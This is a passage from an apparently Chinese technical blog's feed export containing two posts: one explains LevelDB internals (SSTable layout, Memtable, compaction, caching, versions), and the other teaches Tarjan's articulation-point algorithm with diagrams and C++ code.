数据，数据管理区则提供一些索引指针等管理数据，目的是更快速便捷的查找相应的记录。两个区域都是在上述的分块基础上的，就是说文件的前面若干块实际存储 KV 数据，后面数据管理区存储管理数据。管理数据又分为四种不同类型：<strong>Meta Block</strong>，<strong>MetaBlock 索引</strong>和<strong>数据索引块</strong>以及一个<strong>文件尾部块</strong>。</p><p><code>data_block</code>：实际存储的 KV 数据。<br><code>meta_block</code>：每个 data_block 对应一个 meta_block，保存 data_block 中的 key size/value size/kv counts 之类的统计信息，当前版本未实现。<br><code>metaindex_block</code>：保存 meta_block 的索引信息，当前版本未实现。<br><code>index_block</code>：保存每个 data_block 的 last_key 及其在 SSTable 文件中的索引。block 中 entry 的 key 即是 last_key(依赖于FindShortestSeparator()/FindShortSuccessor()的实现)，value即是该data_block的BlockHandler（offset/size）。<br><code>footer</code>：文件末尾固定长度的数据。保存着 metaindex_block 和 index_block 的索引信息(BlockHandler)，为达到固定的长度，添加 padding_bytes。最后有8个字节的 magic 校验。</p><p>footer 的结构如下图所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-07.png" alt="Footer"></p><p><code>metaindex_block_handle</code> 指出了 metaindex block 的起始位置和大小；<code>index_block_handle</code> 指出了 index Block 的起始地址和大小；这两个字段可以理解为索引的索引，是为了正确读出索引值而设立的；为达到固定的长度，添加 <code>padding_bytes</code>。最后有8个字节的 <code>magic</code> 校验。</p><p>下图是数据索引块的内部结构示意图：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-08.png" alt="数据索引"></p><p>Data Block 内的 KV 记录是按照 key 由小到大排列的，数据索引区的每条记录是对某个 Data Block 建立的索引信息，每条索引信息包含三个内容。以上图所示的数据块 i 的索引 index i 来说：</p><p><strong>第一个字段</strong>：记录大于等于数据块i中最大的 key 值的那个 key。在索引里保存的这个 key 值未必一定是某条记录的 key，以上的例子来说，假设数据块i的最小key=“samecity”，最大key=“the best”；数据块i+1的最小key=“the fox”，最大key=“zoo”，那么对于数据块i的索引 index i 来说，其第一个字段记载大于等于数据块i的最大Key(“the best”) 同时要小于数据块i+1的最小Key(“the fox”)，所以例子中 index i 的第一个字段是 “the c”，这个是满足要求的；而 index i+1 的第一个字段则是 “zoo”，即数据块i+1的最大 key。</p><p><strong>第二个字段</strong>：指出数据块 i 在 .sst 文件中的起始位置。</p><p><strong>第三个字段</strong>：指出 Data Block i 的大小（有时候是有数据压缩的）。</p><p>上面主要介绍的是数据管理区的内部结构，下图是数据区的一个 Block 的数据部分布局。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-09.png" alt=""></p><p>从图中可以看出，其内部也分为两个部分，前面是一个个 KV 记录，其顺序是根据 key 值由小到大排列的，在Block尾部则是一些“重启点”（Restart Point），其实是一些指针，指出 Block 内容中的一些记录位置。</p><p>“重启点”是干什么的呢？Block内容里的KV记录是按照 key 大小有序的，这样的话，相邻的两条记录很可能 key 部分存在重叠，比如 key i=“the Car”，Key i+1=“the color”，那么两者存在重叠部分 “the c”，为了减少 key 的存储量，Key i+1 可以只存储和上一条 key 不同的部分 “olor”，两者的共同部分从 key i 中可以获得。记录的 key 在 Block 内容部分就是这么存储的，主要目的是减少存储开销。“重启点”的意思是：在这条记录开始，不再采取只记载不同的 key 部分，而是重新记录所有的 key 值，假设 key i+1 是一个重启点，那么 key 里面会完整存储 “the color”，而不是采用简略的“olor”方式。Block尾部就是指出哪些记录是这些重启点的。</p><p>其中记录的格式如下所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-10.png" alt="记录格式"></p><p>每个记录包含5个字段：</p><p><strong>key共享长度</strong>：比如上面的 “olor” 记录， 其 key 和上一条记录共享的 key 部分长度是 “the c” 的长度，即5；</p><p><strong>key非共享长度</strong>：对于“olor”来说，是4；</p><p><strong>value长度</strong>：指出 key-value 中 value 的长度，在后面的 value 内容字段中存储实际的 value 值；</p><p><strong>key非共享内容</strong>：指实际存储 “olor” 这个 key 字符串；</p><p><strong>value内容</strong>：存储实际的 value 值。</p><h2 id="6-Memtable"><a href="#6-Memtable" class="headerlink" title="6. Memtable"></a>6. Memtable</h2><p>所有 KV 数据都是存储在 Memtable，Immutable Memtable 和 SSTable 中的，Immutable Memtable从结构上讲和 Memtable 是完全一样的，区别仅仅在于其是只读的，不允许写入操作，而 Memtable 则是允许写入和读取的。当 Memtable 写入的数据占用内存到达指定数量，则自动转换为 Immutable Memtable，等待 Dump 到磁盘中，系统会自动生成新的 Memtable 供写操作写入新数据，理解了 Memtable，那么 Immutable Memtable 自然不在话下。</p><p>LevelDB 的 MemTable 提供了将 KV 数据写入，删除以及读取 KV 记录的操作接口，但是事实上 Memtable 并不存在真正的删除操作,删除某个Key的Value在 Memtable 内是作为插入一条记录实施的，但是会打上一个 Key 的删除标记，真正的删除操作是Lazy的，会在以后的 Compaction 过程中去掉这个KV。</p><p>需要注意的是，LevelDB 的 Memtable 中KV对是根据key大小有序存储的，在系统插入新的KV时，LevelDB 要把这个KV插到合适的位置上以保持这种 Key 有序性。其实，LevelDB 的 Memtable 类只是一个接口类，真正的操作是通过背后的 SkipList 来做的，包括插入操作和读取操作等，所以 Memtable 的核心数据结构是一个 SkipList。</p><p>SkipList是由 William Pugh 发明。他在 Communications of the ACM June 1990, 33(6) 668-676 发表了 Skip lists: a probabilistic alternative to balanced trees，在该论文中详细解释了SkipList的数据结构和插入删除操作。关于SkipList的详细介绍可以参考这篇文章：<span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS94dXFpYW5nL2FyY2hpdmUvMjAxMS8wNS8yMi8yMDUzNTE2Lmh0bWzjgII=" title="http://www.cnblogs.com/xuqiang/archive/2011/05/22/2053516.html。">http://www.cnblogs.com/xuqiang/archive/2011/05/22/2053516.html。<i class="fa fa-external-link"></i></span></p><h2 id="7-读记录"><a href="#7-读记录" class="headerlink" title="7. 读记录"></a>7. 读记录</h2><p>因为写入操作比较简单就不介绍了，LevelDB 的读取流程如下所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-11.png" alt="LevelDB读取记录流程"></p><p>LevelDB 首先会去查看内存中的 Memtable，如果 Memtable 中包含 key 及其对应的value，则返回 value 值即可；</p><p>如果在 Memtable 没有读到key，则接下来到同样处于内存中的 Immutable Memtable 中去读取，类似地，如果读到就返回，若是没有读到,那么只能万般无奈下从磁盘中的大量SSTable文件中查找。</p><p>因为SSTable数量较多，而且分成多个level，所以在SSTable中读数据是相当蜿蜒曲折的一段旅程。总的读取原则是这样的：首先从属于 level 0 的文件中查找，如果找到则返回对应的value值，如果没有找到那么到 level 1 中的文件中去找，如此循环往复，直到在某层 SSTable 文件中找到这个 key 对应的 value 为止（或者查到最高level，查找失败，说明整个系统中不存在这个Key)。</p><p>如果给定一个要查询的 key 和某个 key range 包含这个key的 SSTable 文件，那么 LevelDB 是如何进行具体查找过程的呢？LevelDB 一般会先在内存中的Cache中查找是否包含这个文件的缓存记录，如果包含，则从缓存中读取；如果不包含，则打开SSTable文件，同时将这个文件的索引部分加载到内存中并放入Cache中。 这样Cache里面就有了这个SSTable的缓存项，但是只有索引部分在内存中，之后 LevelDB 根据索引可以定位到哪个内容Block会包含这条key，从文件中读出这个Block的内容，在根据记录一一比较，如果找到则返回结果，如果没有找到，那么说明这个level的 SSTable 文件并不包含这个key，所以到下一级别的 SSTable 中去查找。</p><h2 id="8-Compaction"><a href="#8-Compaction" class="headerlink" title="8. Compaction"></a>8. Compaction</h2><p>LevelDB 包含其中两种 compaction 模式：minor 和 major。所谓 <strong>minor Compaction</strong>，就是把 memtable 中的数据导出到 SSTable 文件中；<strong>major compaction</strong> 就是合并不同层级的 SSTable 文件。</p><p><strong>minor Compaction</strong></p><p>Minor compaction 的目的是当内存中的 memtable 大小到了一定值时，将内容保存到磁盘文件中。其机理如下图所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-12.png" alt="Minor compaction"></p><p>当 memtable 数量到了一定程度会转换为 immutable memtable，此时不能往其中写入记录，只能从中读取KV内容。之前介绍过，immutable memtable 其实是一个多层级队列SkipList，其中的记录是根据 key 有序排列的。所以这个 minor compaction 实现起来也很简单，就是按照 immutable memtable 中记录由小到大遍历，并依次写入一个 level 0 的新建 SSTable 文件中，写完后建立文件的 index 数据，这样就完成了一次minor compaction。</p><p>从上图中也可以看出，对于被删除的记录，在 minor compaction 过程中并不真正删除这个记录，原因也很简单，这里只知道要删掉 key 记录，但是这个 KV 数据在哪里？那需要复杂的查找，所以在 minor compaction 的时候并不做删除，只是将这个 key 作为一个记录写入文件中，至于真正的删除操作，在以后更高层级的 compaction 中会去做。</p><p><strong>major compaction</strong></p><p>当某个 level 下的 SSTable 文件数目超过一定设置值后，levelDB 会从这个 level 的 SSTable 中选择一个文件（level&gt;0），将其和高一层级的 level+1 的 SSTable 文件合并，这就是 major compaction。</p><p>在大于 0 的层级中，每个 SSTable 文件内的key都是由小到大有序存储的，而且不同文件之间的key范围（文件内最小key和最大key之间）不会有任何重叠。level 0 的 SSTable 文件有些特殊，尽管每个文件也是根据Key由小到大排列，但是因为 level 0 的文件是通过 minor compaction 直接生成的，所以任意两个 level 0下的两个 SSTable 文件可能再key范围上有重叠。所以在做 major compaction 的时候，对于大于 level 0 的层级，选择其中一个文件就行，但是对于 level 0 来说，指定某个文件后，本 level 中很可能有其他 SSTable 文件的 key 范围和这个文件有重叠，这种情况下，要找出所有有重叠的文件和 level 1 的文件进行合并，即 level 0 在进行文件选择的时候，可能会有多个文件参与 major compaction。</p><p>LevelDB 在选定某个 level 进行 compaction 后，还要选择是具体哪个文件要进行 compaction，LevelDB 在这里有个小技巧， 就是说轮流来，比如这次是文件A进行 compaction，那么下次就是在 key range 上紧挨着文件A的文件B进行 compaction，这样每个文件都会有机会轮流和高层的 level 文件进行合并。</p><p>如果选好了 level i 的文件A和 level i+1 层的文件进行合并，那么问题又来了，应该选择 level i+1 哪些文件进行合并？LevelDB 选择 i+1 层中和文件A在 key range 上有重叠的所有文件来和文件A进行合并。</p><p>也就是说，选定了 level i 的文件A，之后在 level i+1 中找到了所有需要合并的文件B,C,D… 等等。剩下的问题就是具体是如何进行 major 合并的？就是说给定了一系列文件，每个文件内部是key有序的，如何对这些文件进行合并，使得新生成的文件仍然Key有序，同时抛掉哪些不再有价值的 KV 数据。</p><p>下图所示的是合并过程：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-13.png" alt="SSTable compaction"></p><p>major compaction 的过程如下：对多个文件采用多路归并排序的方式，依次找出其中最小的key记录，也就是对多个文件中的所有记录重新进行排序。之后采取一定的标准判断这个key是否还需要保存，如果判断没有保存价值，那么直接抛掉，如果觉得还需要继续保存，那么就将其写入 level i+1 层中新生成的一个 SSTable 文件中。就这样对KV数据一一处理，形成了一系列新的 i+1 层数据文件，之前的 i 层文件和 i+1 层参与 compaction 的文件数据此时已经没有意义了，所以全部删除。这样就完成了 i 层和 i+1 层文件记录的合并过程。</p><p>那么在 major compaction 过程中，判断一个KV记录是否抛弃的标准是什么呢？其中一个标准是:对于某个key来说，如果在小于 i 层中存在这个key，那么这个KV在major compaction 过程中可以抛掉。因为，对于层级低于 i 的文件中如果存在同一 key 的记录，那么说明对于 key 来说，有更新鲜的 value 存在，那么过去的 value 就等于没有意义了，所以可以删除。</p><h2 id="9-Cache"><a href="#9-Cache" class="headerlink" title="9. Cache"></a>9. Cache</h2><p>读取操作如果没有在内存的 memtable 中找到记录，要多次进行磁盘访问操作。假设最优情况，即第一次就在 level 0 中最新的文件中找到了这个 key，那么也需要读取2次磁盘，一次是将 SSTable 的文件中的 index 部分读入内存，这样根据这个 index 可以确定 key 是在哪个 block 中存储；第二次是读入这个 block 的内容，然后在内存中查找 key 对应的 value。</p><p>LevelDB 中引入了两个不同的 Cache:Table Cache 和 Block Cache。其中 Block Cache 是配置可选的，即在配置文件中指定是否打开这个功能。</p><p>下图是 table cache 的结构：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-14.png" alt="SSTable compaction"></p><p>在 Cache 中，key值是 SSTable 的文件名称，value 部分包含两部分，一个是指向磁盘打开的 SSTable 文件的文件指针，这是为了方便读取内容；另外一个是指向内存中这个 SSTable 文件对应的 Table 结构指针，table结构在内存中，保存了 SSTable 的 index 内容以及用来指示 block cache 用的 cache_id ，当然除此外还有其它一些内容。</p><p>比如在 get(key) 读取操作中，如果 LevelDB 确定了key在某个level下某个文件A的key range范围内，那么需要判断是不是文件A真的包含这个KV。此时，LevelDB 会首先查找 Table Cache，看这个文件是否在缓存里，如果找到了，那么根据 index 部分就可以查找是哪个 block 包含这个 key。如果没有在缓存中找到文件，那么打开 SSTable 文件，将其 index 部分读入内存，然后插入 Cache 里面，去 index 里面定位哪个 block 包含这个 key 。如果确定了文件哪个 block 包含这个 key，那么需要读入 block 内容，这是第二次读取。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-15.png" alt="SSTable compaction"></p><p>Block Cache是为了加快这个过程的。上图是block cache 的结构。其中的key是文件的cache_id加上这个block在文件中的起始位置block_offset。而value则是这个Block的内容。</p><p>如果 LevelDB发现这个 block 在 block cache 中，那么可以避免读取数据，直接在 cache 里的 block 内容里面查找key的value就行，如果没找到呢？那么读入 block 内容并把它插入 block cache 中。LevelDB 就是这样通过两个 cache 来加快读取速度的。从这里可以看出，如果读取的数据局部性比较好，也就是说要读的数据大部分在cache里面都能读到，那么读取效率应该还是很高的，而如果是对key进行顺序读取效率也应该不错，因为一次读入后可以多次被复用。但是如果是随机读取，您可以推断下其效率如何。</p><h2 id="10-Version"><a href="#10-Version" class="headerlink" title="10. Version"></a>10. Version</h2><p><strong>Version</strong> 保存了当前磁盘以及内存中所有的文件信息，一般只有一个 Version 叫做 “current” version（当前版本）。LevelDB还保存了一系列的历史版本，这些历史版本有什么作用呢？</p><p>当一个 Iterator 创建后，Iterator 就引用到了 current version(当前版本)，只要这个 Iterator 不被 delete 那么被 Iterator 引用的版本就会一直存活。这就意味着当你用完一个 Iterator 后，需要及时删除它。</p><p>当一次 Compaction 结束后（会生成新的文件，合并前的文件需要删除），LevelDB 会创建一个新的版本作为当前版本，原先的当前版本就会变为历史版本。</p><p><strong>VersionSet</strong> 是所有 Version的集合，管理着所有存活的 Version。</p><p><strong>VersionEdit</strong> 表示 Version 之间的变化，相当于 delta 增量，表示有增加了多少文件，删除了文件。他们之间的关系如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Version0 +VersionEdit--&gt;Version1</span><br></pre></td></tr></table></figure><p>VersionEdit 会保存到 manifest 文件中，当做数据恢复时就会从 manifest 文件中读出来重建数据。</p><p>这其实是一种MVCC思想的实现。后续</p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tarjan算法详解</title>
      <link href="/archives/ed32a852.html"/>
      <url>/archives/ed32a852.html</url>
      
        <content type="html"><![CDATA[<p>今天来说说tarjan算法，一种用于求解连通图的关键点算法。</p><a id="more"></a><h2 id="1-什么是关节点？"><a href="#1-什么是关节点？" class="headerlink" title="1.什么是关节点？"></a>1.什么是关节点？</h2><p>假设现在有一个连通图，在去掉这个图中的某个节点后，连通分量增加，那么这个节点就是关节点。如下图的3去掉后，整个图拆分为了4个连通分量{1,2,4,5}</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200920111152803.png" alt="image-20200920111152803" style="zoom: 67%;" /><h2 id="2-求解关键点"><a href="#2-求解关键点" class="headerlink" title="2.求解关键点"></a>2.求解关键点</h2><h3 id="1-暴力法"><a href="#1-暴力法" class="headerlink" title="1. 暴力法"></a>1. 暴力法</h3><p>如果在没有学习过tarjan算法前，求解一个图的关键点最直观的方法就是暴力求解。可以分别在原连通图中去掉一点，然后用dfs或bfs遍历，若在去掉某个的点后，整个图的连通度有所增加，则该点一定是个关键点。伪代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;node1,node2...noden&#125;</span><br><span class="line">去掉nodei</span><br><span class="line">求解当前图的连通度</span><br><span class="line">if 连通度增加</span><br><span class="line">nodei 是关键点</span><br><span class="line">复原nodei</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>显然，包利发虽然简单，但是复杂度较高。下面我们来看tarjan算法。</p><h3 id="2-tarjan算法"><a href="#2-tarjan算法" class="headerlink" title="2. tarjan算法"></a>2. tarjan算法</h3><p><strong>回边概念</strong></p><p>为了说明方便，我们以下图为例：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200920111908187.png" alt="image-20200920111908187" style="zoom:67%;" /><p>现在，我们从0开始对这个图做一个dfs<strong>先序</strong>遍历，可以得到<strong>深度优先搜索树</strong>如下：</p><img data-src="https://pic.downk.cc/item/5f674a36160a154a67fe2e78.png" alt="image-20200920112158018" style="zoom:50%;" /><p>这个图和上个图唯一的区别在于将1-3的边改为了红色，因为实际遍历过程中，不会经过这条边，我们把这种在dfs遍历中不会经过的边但又实际存在图中的边称为<strong>“回边“</strong>。</p><p>ok，有了回边的概念，现在说明我们应该如何确定连通图中的关键点：</p><blockquote><p>以下摘自: <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbnVsbHp4L3AvNzk2ODExMC5odG1s" title="https://www.cnblogs.com/nullzx/p/7968110.html">https://www.cnblogs.com/nullzx/p/7968110.html<i class="fa fa-external-link"></i></span></p></blockquote><p>假设DFS中我们从顶点U访问到了顶点V（此时顶点V还未被访问过），那么我们称顶点U为顶点V的父顶点，V为U的孩子顶点。在顶点U之前被访问过的顶点，我们就称之为U的祖先顶点。</p><p>显然如果顶点U的<strong>所有孩子顶点</strong>可以不通过父顶点U而访问到U的祖先顶点，那么说明此时去掉顶点U不影响图的连通性，U就不是割点。相反，如果顶点U<strong>至少存在一个孩子顶点</strong>，必须通过父顶点U才能访问到U的祖先顶点，那么去掉顶点U后，顶点U的祖先顶点和孩子顶点就不连通了，说明U是一个割点。</p><p><img data-src="https://pic.downk.cc/item/5f674a53160a154a67fe3be6.png" alt="image-20200920112749317"></p><p>上图中的箭头表示DFS访问的顺序（而不表示有向图），对于顶点D而言，D的孩子顶点可以通过连通区域1红色的边回到D的祖先顶点C（此时C已被访问过），所以此时D不是割点。</p><p><img data-src="https://pic.downk.cc/item/5f674a76160a154a67fe4a72.png" alt="image-20200920112807700"></p><p>上图中的连通区域2中的顶点，必须通过D才能访问到D的祖先顶点，所以说此时D为割点。再次强调一遍，箭头仅仅表示DFS的访问顺序，而不是表示该图是有向图。</p><p>除了上述情况，我们还应该考虑一个特殊情况，那就是DFS的根节点，因为根节点没有祖先节点。其实根顶点是不是割点也很好判断，如果从根顶点出发，一次DFS就能访问到所有的顶点，那么根顶点就不是割点。反之，如果回溯到根顶点后，还有未访问过的顶点，需要在邻接顶点上再次进行DFS，根顶点就是割点。</p><p>所以，tarjan算法的核心可以总结如如下两条规则：</p><ol><li>对于dfs生成树的根节点，如果根节点存在两颗或者两颗以上的子树，则该该节点必为关键点。</li><li>对于非叶子节点v，若v的子树中的所有节点均无指向v的祖先节点的回边，则v为关键点。</li></ol><p>对于规则1,非常好判断。所以主要说一下规则2：</p><p>要实现规则2，我们需要三个辅助数组：</p><ol><li>dfn[n]数组</li></ol><p>dfn数组的下标表示图中定点的编号，数组中的值表示dfs中的遍历顺序（访问时间戳）。每访问到一个未访问过的顶点，访问顺序的值（时间戳）就增加1。子顶点的dfn值一定比父顶点的dfn值大（但不一定恰好大1，比如父顶点有两个及两个以上分支的情况）。在访问一个顶点后，它的dfn的值就确定下来了，不会再改变。</p><ol start="2"><li>low数组</li></ol><p>low数组的下标表示顶点的编号，数组中的值表示DFS中该顶点<strong>不通过父顶点</strong>能访问到的祖先顶点中最小的顺序值（或者说时间戳）。</p><blockquote><p>想一下，为什么不能通过父顶点来访问父顶点的祖先顶点？</p><p>因为我们是要判断父节点是不是关键点，如果以父节点做中间访问点就没有意义了。</p></blockquote><p>请好好理解low数组，因为它是tarjan算法的核心。</p><ol start="3"><li>parent数组</li></ol><p>parent数组的下标标识顶点的编号，数组中的值表示该顶点的父节点编号。主要用于辅助low数组的计算，再次说明low数组的含义是节点不通过其父节点能够访问的最小祖先节点的时间戳。</p><h3 id="3-看一个例子"><a href="#3-看一个例子" class="headerlink" title="3. 看一个例子"></a>3. 看一个例子</h3><p>图片摘自：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbnVsbHp4L3AvNzk2ODExMC5odG1s" title="https://www.cnblogs.com/nullzx/p/7968110.html">https://www.cnblogs.com/nullzx/p/7968110.html<i class="fa fa-external-link"></i></span></p><p>可见，最难计算的是low数组。下面以一个具体的例子来说明如何计算dfn和low数组：</p><p>下图中蓝色实线箭头表示已访问过的路径，无箭头虚线表示未访问路径。已访问过的顶点用黄色标记，未访问的顶点用白色标记，DFS当前正在处理的顶点用绿色表示。带箭头的蓝色虚线表示DFS回溯时的返回路径。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200920114204133.png" alt="image-20200920114204133"></p><p>假设从A点出发，当前遍历到I节点，注意dfn数组是如何计算的，只要dfs前进一步，dfn就会+1. low数组的初始值和dfn相同。</p><p>当前节点为I，I想继续往前，但是发现D已经被遍历过了，于是（I，D）形成一个回边，且D不是I的父亲节点。所以我们可以更新I的low值，具体更新规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(low[I] &gt; dfn[D] )</span><br><span class="line"></span><br><span class="line">  low[I] &#x3D; dfn[D]</span><br></pre></td></tr></table></figure><p>所以现在I的low值为4，</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200920114503369.png" alt="image-20200920114503369"></p><p>现在I没有其他连接点，所以回退到H，H发现可以通过I到达D，且D不是H的父亲节点。于是可以更新H的low值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(low[I] &lt; dfn[H] &amp;&amp; low[I] !&#x3D; dfn[parent[D]])</span><br><span class="line"> low[H] &#x3D; low[I]</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.downk.cc/item/5f674a8b160a154a67fe53eb.png" alt="image-20200920115233737"></p><p>现在H继续向前到J：</p><p><img data-src="https://pic.downk.cc/item/5f674aa4160a154a67fe5edb.png" alt="image-20200920115330764"></p><p><img data-src="https://pic.downk.cc/item/5f674acc160a154a67fe71ab.png" alt="image-20200920115344808"></p><p>同理，由DFS访问顶点B，dfn[J] &gt; dfn[B]，B为祖先顶点，顶点J不经过父顶点H能访问到的最早时间戳就是dfn[B]，即low[J] = 2</p><p><img data-src="https://pic.downk.cc/item/5f674ae1160a154a67fe7b26.png" alt="image-20200920115401233"></p><p>我们从顶点J回溯到顶点H，显然到目前为止顶点H能访问到的最早时间戳就更新为2（因为我们到现在为止知道了能从H访问到J），所以low[H] = 2。</p><p>ok，后面重新回溯到G-&gt;F-&gt;E, 剩下的过程（访问K和L）和上面类似，不再赘述。</p><h3 id="4-tarjan-C-实现"><a href="#4-tarjan-C-实现" class="headerlink" title="4. tarjan C++实现"></a>4. tarjan C++实现</h3><p>既然核心的部分已经理解了，代码写起来就相对容易了。</p><p>1.首先声明几个辅助数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; visited;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dfn;         <span class="comment">/*第一次访问到第idx个节点时的时间戳*/</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; low;         <span class="comment">/*第idx个节点及其子树能够回溯到的最小节点处的时间戳*/</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; parent;      <span class="comment">/*第idx个节点的父亲节点*/</span></span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; joint_node;      <span class="comment">/* 保存关节点 */</span></span><br></pre></td></tr></table></figure><ol start="2"><li>初始化图</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* create graph from the input file */</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;&amp;link_graph = create_link_graph();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">create_link_graph</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">string</span> <span class="title">path</span><span class="params">(<span class="string">"/home/raven/Projects/Clion/MyLeetCode/0.数据结构/6.图/tarjan_input1.txt"</span>)</span></span>;</span><br><span class="line">    <span class="function">ifstream <span class="title">fin</span><span class="params">(path)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!fin.is_open()) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> node_num;</span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">line</span>;</span><br><span class="line">    fin &gt;&gt; node_num;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">link_graph</span><span class="params">(node_num, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;())</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (getline(fin, <span class="built_in">line</span>)) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> i = <span class="built_in">line</span>.find_first_of(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="built_in">std</span>::<span class="built_in">string</span>::npos) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> num_str = <span class="built_in">line</span>.substr(<span class="number">0</span>, i); <span class="comment">/* 序号 */</span></span><br><span class="line">        <span class="built_in">string</span> connect_node = <span class="built_in">line</span>.substr(i + <span class="number">1</span>, <span class="built_in">line</span>.<span class="built_in">size</span>() - i);   <span class="comment">/* 想连接的点 */</span></span><br><span class="line">        <span class="function"><span class="built_in">stringstream</span> <span class="title">sstream1</span><span class="params">(num_str)</span></span>;</span><br><span class="line">        sstream1 &gt;&gt; i;</span><br><span class="line">        <span class="function"><span class="built_in">stringstream</span> <span class="title">sstream2</span><span class="params">(connect_node)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 初始化与 i 相连的node */</span></span><br><span class="line">        <span class="keyword">int</span> temp;</span><br><span class="line">        <span class="keyword">while</span> (sstream2 &gt;&gt; temp) &#123;</span><br><span class="line">            link_graph[i].push_back(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> link_graph;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：tarjan_input1.txt文件如下:</p><p>首行代表节点个数，其余行代表从一个链链表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">0: 1</span><br><span class="line">1: 0 2 3</span><br><span class="line">2: 1 3</span><br><span class="line">3: 1 2 4 5</span><br><span class="line">4: 3</span><br><span class="line">5: 3</span><br></pre></td></tr></table></figure><p>这里采用邻接链表的方式保存图， 原图如下：</p><img data-src="https://pic.downk.cc/item/5f674af8160a154a67fe8508.png" alt="image-20200920120055167" style="zoom:67%;" /><ol start="3"><li>tarjan算法</li></ol><p>显然tarjan算法和dfs算法有联系：我们把dfs的框架搭起来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;vecotr&lt;<span class="keyword">int</span>&gt;&gt; &amp;graph, <span class="keyword">int</span> cur_node)</span></span></span><br><span class="line"><span 